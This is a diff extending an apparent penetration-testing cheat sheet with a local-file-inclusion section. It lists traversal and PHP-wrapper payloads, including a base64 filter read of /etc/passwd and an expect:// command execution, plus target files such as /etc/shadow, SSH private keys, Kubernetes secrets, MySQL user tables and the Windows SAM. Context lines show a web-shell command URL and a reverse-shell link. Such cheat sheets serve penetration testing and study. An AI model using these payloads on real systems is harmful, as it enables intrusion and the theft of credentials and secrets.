@@ -155,3 +155,66 @@ http://site.com/path/to/shell.php?_=system&__=ls
 ```
 ### PHP Reverse Shell > <a name="php_reverse_shell"></a>PHP Reverse Shell (Pentestmonkey)
 ###### https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+____
+
+### LFI > <a name="directory_traversal"></a>Directory Traversal
+###### some.php?file=../../../../../../../etc/passwd
+
+### LFI > <a name="php_wrapper_file"></a>PHP Wrapper php://file
+###### example.php?page=expect://ls
+
+### LFI > <a name="php_wrapper_filter"></a>PHP Wrapper php://filter
+###### example.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+### LFI > <a name="useful_lfi_linux"></a>Useful LFI files (Linux)
+```html
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/ssh/ssh_config
+/etc/ssh/sshd_config
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/user/.ssh/authorized_keys
+/home/user/.ssh/id_rsa
+/proc/[0-9]*/fd/[0-9]*
+/proc/mounts
+/home/$USER/.bash_history
+/home/$USER/.ssh/id_rsa
+/var/run/secrets/kubernetes.io/serviceaccount
+/var/lib/mlocate/mlocate.db
+/var/lib/mlocate.db
+```
+### LFI > <a name="useful_lfi_apache"></a>Useful LFI files (Apache)
+```html
+/etc/apache2/apache2.conf
+/usr/local/etc/apache2/httpd.conf
+/etc/httpd/conf/httpd.conf
+Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
+Debian/Ubuntu -> /var/log/apache2/access.log
+FreeBSD -> /var/log/httpd-access.log
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache2/access.log
+/var/log/apache/error.log
+```
+### LFI > <a name="useful_lfi_mysql"></a>Useful LFI files (MySQL)
+```html
+/var/lib/mysql/mysql/user.frm
+/var/lib/mysql/mysql/user.MYD
+/var/lib/mysql/mysql/user.MYI
+```
+### LFI > <a name="useful_lfi_windows"></a>Useful LFI files (Windows)
+```html
+/boot.ini
+/autoexec.bat
+/windows/system32/drivers/etc/hosts
+/windows/repair/SAM
+/windows/panther/unattended.xml
+/windows/panther/unattend/unattended.xml
+/windows/system32/license.rtf
+/windows/system32/eula.txt
+```
